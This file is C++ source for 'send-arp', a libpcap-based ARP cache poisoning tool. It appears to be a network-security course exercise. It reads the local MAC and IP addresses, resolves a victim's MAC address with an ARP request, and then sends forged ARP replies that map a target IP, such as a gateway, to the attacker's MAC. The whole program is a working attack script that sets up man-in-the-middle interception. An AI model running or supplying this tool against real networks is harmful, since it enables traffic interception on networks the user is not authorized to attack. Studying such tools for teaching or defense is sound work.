#include <bits/stdc++.h>

#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "mac.h"

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <pcap.h>
#include <cstdint>


#define N_ITER 1000

using namespace std;


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

Mac attacker_mac;
Ip attacker_ip;
pcap_t* handle;


void set_attacker(char* interface) {
	// find my mac address, and set it to attacker_mac
	// find my IP address. set it to attacker IP.
	// code referenced from https://stackoverflow.com/a/1779800 & https://technote.kr/176

	struct ifreq s;
	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
	strcpy(s.ifr_name, interface);

	char ipstr[40];


	if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
		Mac tmp((uint8_t*)s.ifr_addr.sa_data); // ok, so pointer hack does the trick... but... nasty...
		//D cout << (string)tmp << endl; debug code.
		inet_ntop(AF_INET, s.ifr_addr.sa_data + 2, ipstr, sizeof(struct sockaddr));

		attacker_mac = tmp;
		attacker_ip = Ip((string)ipstr); // again.. nasty pointer hack...
	}
	cout << "My Mac address :: " << (string)attacker_mac << '\n';
	cout << "My IP address :: (reversed)" << (string)attacker_ip << '\n';

}

int send_arp(Mac eth_dmac, Mac eth_smac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip, uint16_t op) {
	// pretty much from gilgil codebase.

	EthArpPacket packet;
	packet.eth_.dmac_ = eth_dmac;
	packet.eth_.smac_ = eth_smac;
	packet.arp_.smac_ = arp_smac;
	packet.arp_.sip_ = htonl(arp_sip);
	packet.arp_.tmac_ = arp_tmac;
	packet.arp_.tip_ = htonl(arp_tip);
	packet.arp_.op_ = htons(op);

	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;


	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0 || (op != ArpHdr::Request && op != ArpHdr::Reply)) { // op must be request or reply.
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return -1;
	}
	return 0;
}


Mac from_ip(Ip _ip) {
	// use attacker's mac, ip address + arp request packet to get mac address of target from target's ip address.

	// first send arp
	Mac _dmac((string)"ff:ff:ff:ff:ff:ff");
	Mac _arp_tmac((string)"00:00:00:00:00:00");
	const pcap_pkthdr* header;
	const u_char* pkt_data;

	int sends = send_arp(_dmac, attacker_mac, attacker_mac, attacker_ip, _arp_tmac, _ip, ArpHdr::Request);
	int cnt = 0;
	while (cnt < N_ITER) {
		cnt += 1;
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		EthHdr* _current_eth = (struct EthHdr*)(packet);
		ArpHdr* _current_arp = (struct ArpHdr*)(packet + 14);

		//if (_current_eth->type_ != htons(EthHdr::Arp)) continue;
		cout << (string)_current_arp->sip_ << '\n' << (string)(Ip)htonl(_ip) << '\n';
		if (_current_arp->sip_ != htonl(_ip)) continue;
		cout << "Found The Mac from IP " << (string)_ip << " : \n " << (string)_current_arp->smac_ << endl;
		return _current_eth->smac_;

	}
	cout << "iterated over " << N_ITER << "but no hope" << endl;
	return Mac((string)"00:00:00:00:00:00");

}



int main(int argc, char* argv[]) {

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	// set my (attacker) mac addr, ip addr.
	set_attacker(dev);

	for (int i = 2; i < argc; i += 2) {
		Ip sender_ip(argv[i]);
		Ip target_ip(argv[i + 1]);

		cout << "Retreiving Mac from Victom's Ip \n";

		Mac sender_mac = from_ip(sender_ip);

		// attack!

		int succ = send_arp(sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, ArpHdr::Reply);

		cout << "Report " << i << ": \n Got Sender Ip (Victom's Ip) " << (string)sender_ip << " and Sender Mac " << (string)sender_mac << endl;
		cout << "Got Target Ip " << (string)target_ip << endl;
		cout << "Was " << (succ == 0 ? "succesful" : "unsuccesful") << endl;
		cout << "Check if Packet context has " << (string)attacker_mac << " in it!" << endl;
	}


	pcap_close(handle);
}
